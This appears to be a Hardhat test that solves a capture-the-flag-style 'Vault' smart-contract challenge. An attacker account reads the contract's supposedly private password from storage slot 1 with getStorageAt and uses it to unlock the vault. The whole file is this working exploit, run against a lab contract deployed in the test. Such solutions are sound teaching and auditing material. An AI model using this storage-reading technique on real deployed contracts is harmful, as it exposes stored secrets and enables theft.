import { expect } from "chai";
import { ethers } from "hardhat";

describe("Vault", async function () {

  it("Should unlock the vault", async function () {
    //+setup
    const [deployer, attacker] = await ethers.getSigners()
    const Vault = await ethers.getContractFactory("Vault");
    const vault = await Vault.deploy(ethers.utils.toUtf8Bytes("A very strong secret password :)"));
    await vault.deployed();
    //-setup


    //1.Call getStorageAt to retrieve the password value at position 1
    const password = await ethers.provider.getStorageAt(vault.address, "0x1")

    //2.Call unlock to change locked value to false
    await vault.connect(attacker).unlock(password)

    expect(await vault.locked()).to.eq(false)
  });
});